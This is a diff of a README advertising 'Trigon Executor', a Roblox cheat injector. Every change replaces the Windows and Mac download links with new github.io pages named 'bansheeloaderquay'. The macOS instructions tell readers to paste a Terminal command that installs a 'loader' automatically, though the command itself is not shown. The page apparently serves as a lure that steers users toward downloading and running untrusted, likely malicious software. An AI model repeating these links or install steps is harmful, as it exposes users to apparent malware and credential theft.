@@ -10,8 +10,8 @@ Trigon Executor combines a 98% UNC score with a lightning-fast injection engine 
 
 <div align="center">
 
-[![Download Trigon Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
+[![Download Trigon Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
 
 </div>
 
@@ -41,14 +41,14 @@ Trigon Executor combines a 98% UNC score with a lightning-fast injection engine 
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 ### 🍎 macOS
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Paste the command and press Enter
 3. Follow the prompts — the loader installs automatically
 
-[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
+[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
 
 ---
 
@@ -84,5 +84,5 @@ Trigon Executor combines a 98% UNC score with a lightning-fast injection engine 
 
 ---
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
